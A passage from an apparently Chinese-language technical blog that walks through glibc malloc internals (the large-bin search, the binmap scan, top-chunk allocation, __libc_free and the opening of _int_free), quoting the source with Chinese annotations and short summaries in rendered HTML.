class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<span class="hljs-comment">//标记bin已使用（binmap）</span><br>      <span class="hljs-comment">//更新双向链表</span><br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="hljs-comment">//检查最大尝试次数</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="编译后largebins"><a href="#编译后largebins" class="headerlink" title="编译后largebins"></a>编译后largebins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">         If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>        &#123;<br>          bin = bin_at (av, idx);<span class="hljs-comment">//获取头指针</span><br><br>          <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><span class="hljs-comment">//跳过链表为空或第一个chunk大小小于请求大小</span><br>          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>               <span class="hljs-comment">//寻找大小合适的chunk</span><br>              victim = victim-&gt;bk_nextsize;<br>              <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize;<br><br>              <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                 list does not have to be rerouted.  */</span><br>               <span class="hljs-comment">//若找到的chunk不是最后一个且与下一个chunk大小相同就跳过这个chunk</span><br>              <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>                victim = victim-&gt;fd;<br><br>              remainder_size = size - nb;<span class="hljs-comment">//计算剩余大小</span><br>              unlink (av, victim, bck, fwd);<span class="hljs-comment">//移除找到的chunk</span><br><br>              <span class="hljs-comment">/* Exhaust */</span><br>               <span class="hljs-comment">//对剩余部分的处理</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<span class="hljs-comment">//若剩余部分&lt;MINSIZE，就标记整个chunk已使用</span><br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<span class="hljs-comment">//分割</span><br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><span class="hljs-comment">/* 我们不能假设unsorted bin是空的，因此必须在这里执行完整的插入操作。 */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<span class="hljs-comment">//上述代码作用是将剩余部分插入到unsorted bin中</span><br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<span class="hljs-comment">//设置分割后的chunk大小与状态</span><br>                &#125;<br>               <span class="hljs-comment">//返回内存地址</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>逻辑：</p><ol><li>获取 largebin 的头指针</li><li>在排序链表中查找合适大小的 chunk</li><li>移除找到的 chunk</li><li>如果剩余部分足够大，则分割 chunk，并将剩余部分插入<code>unsorted bin</code></li><li>返回内存地址</li></ol><h3 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">         bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">         (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">         that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">         The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">         when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">       */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过扫描 bins 来搜索合适的 chunk，从下一个较大的 bin 开始。</span><br><span class="hljs-comment"> * 这种搜索严格遵循最佳拟合策略；即选择最小的（如果有多个大小相同的 chunk，则选择最近最少使用的）chunk。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 位图（binmap）避免了检查大多数块是否为空的需要。</span><br><span class="hljs-comment"> * 在没有返回任何 chunk 的热启动阶段，跳过所有 bins 的情况比看起来要快。</span><br><span class="hljs-comment"> */</span><br><br>      ++idx;<span class="hljs-comment">//从下一个bin开始搜索</span><br>      bin = bin_at (av, idx);<span class="hljs-comment">//获取当前bin的指针</span><br>      block = idx2block (idx);<span class="hljs-comment">//计算当前bin所在块索引</span><br>      <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//获取当前块的binmap</span><br>      bit = idx2bit (idx);<span class="hljs-comment">//获取当前bin对应的位</span><br><br>      <span class="hljs-keyword">for</span> (;; )<br>        &#123;<br>          <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>          <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-keyword">do</span><span class="hljs-comment">//若超出bins的范围就跳到使用top chunk</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                    <span class="hljs-keyword">goto</span> use_top;<br>                &#125;<br>              <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>              bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>          <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//找到第一个非空bin</span><br>            &#123;<br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>              assert (bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>          <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>          victim = last (bin);<span class="hljs-comment">//获取bin最后一个chunk</span><br><br>          <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>          <span class="hljs-keyword">if</span> (victim == bin)<span class="hljs-comment">//若bin为空</span><br>            &#123;<br>              av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><span class="hljs-comment">//清除对应的位</span><br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-keyword">else</span><span class="hljs-comment">//若不为空</span><br>            &#123;<br>              size = chunksize (victim);<span class="hljs-comment">//获取大小</span><br><br>              <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>              assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>              remainder_size = size - nb;<span class="hljs-comment">//剩余部分</span><br><br>              <span class="hljs-comment">/* unlink */</span><br>              unlink (av, victim, bck, fwd);<br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<span class="hljs-comment">//剩余&lt;MINSIZE</span><br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<span class="hljs-comment">//标记整个chunk为已使用</span><br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br><br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><span class="hljs-comment">//分割</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<br><br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                   <span class="hljs-comment">//将剩余部分插入unsorted bin</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br><br>                  <span class="hljs-comment">/* advertise as last remainder */</span><br>                  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                    av-&gt;last_remainder = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<span class="hljs-comment">//设置大小状态</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<span class="hljs-comment">//返回地址</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ol><li>从下一个较大的 bin 开始搜索。</li><li>使用位图跳过空块，提高搜索效率。</li><li>在非空 bin 中找到合适的 chunk。</li><li>如果找到的 chunk 大小合适，则直接分配。</li><li>如果 chunk 大小过大，则分割 chunk，并将剩余部分插入<code>unsorted bin</code></li><li>返回分配的内存地址。</li></ol><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>      victim = av-&gt;top;<span class="hljs-comment">//获取top chunk</span><br>      size = chunksize (victim);<span class="hljs-comment">//获取top的大小</span><br><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<span class="hljs-comment">//top chunk足够大</span><br>        &#123;<br>          remainder_size = size - nb;<span class="hljs-comment">//计算剩余</span><br>          remainder = chunk_at_offset (victim, nb);<span class="hljs-comment">//分割</span><br>          av-&gt;top = remainder;<br>          set_head (victim, nb | PREV_INUSE |<br>                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head (remainder, remainder_size | PREV_INUSE);<span class="hljs-comment">//设置剩余部分头部信息</span><br><br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<span class="hljs-comment">//返回分配的内存地址</span><br>        &#125;<br><br>      <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<span class="hljs-comment">//合并fastbins后再次尝试分配</span><br>        &#123;<br>          malloc_consolidate (av);<span class="hljs-comment">//合并fastbins</span><br>          <span class="hljs-comment">/* restore original bin index */</span><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>            idx = smallbin_index (nb);<br>          <span class="hljs-keyword">else</span><br>            idx = largebin_index (nb);<br>        &#125;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">else</span><span class="hljs-comment">//上述都不满足，则调用系统级内存分配函数</span><br>        &#123;<br>          <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<span class="hljs-comment">//调用系统级内存分配函数</span><br>          <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ol><li>使用 <code>top chunk</code> 分配内存。</li><li>合并 fastbins 后再次尝试分配</li><li>调用系统级内存分配函数（如 <code>sbrk</code> 或 <code>mmap</code>）</li></ol><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="_libc_free"></a>_libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>     <span class="hljs-comment">//检查是否有用户自定义逻辑</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect （free(0)无任何效果i）*/</span><br>    <span class="hljs-keyword">return</span>;<span class="hljs-comment">//如果传入指针是NULL直接返回</span><br><br>  p = mem2chunk (mem);<span class="hljs-comment">//将用户指针转换为chunk指针</span><br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))    <span class="hljs-comment">//看是否是mmap分配的内存块                   /* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>       <span class="hljs-comment">//动态调整相关</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<span class="hljs-comment">//mmap对应的释放函数</span><br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<span class="hljs-comment">//调用释放函数</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="初始化："><a href="#初始化：" class="headerlink" title="初始化："></a>初始化：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin(相关的fastbin) */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk （紧邻的下一个chunk）*/</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used（若下个chunk正在被使用，就为true） */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk（紧邻的上个chunk大小） */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking （用于临时链接的临时变量）*/</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<span class="hljs-comment">//获取当前chunk大小</span><br><br></code></pre></td></tr></table></figure><h3 id="安全检查："><a href="#安全检查：" class="headerlink" title="安全检查："></a>安全检查：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">     allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">     Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">     here by accident or by &quot;design&quot; from some intruder.  */</span><br><span class="hljs-comment">/* 一个不会影响性能的小型安全检查：分配器永远不会在地址空间的末尾回绕。因此，我们可以排除一些可能偶然出现或被“设计”出来的大小值，这些值可能来自某些入侵者。 */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<span class="hljs-comment">//指针是否合法||内存块地址是否符合对其要求</span><br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock 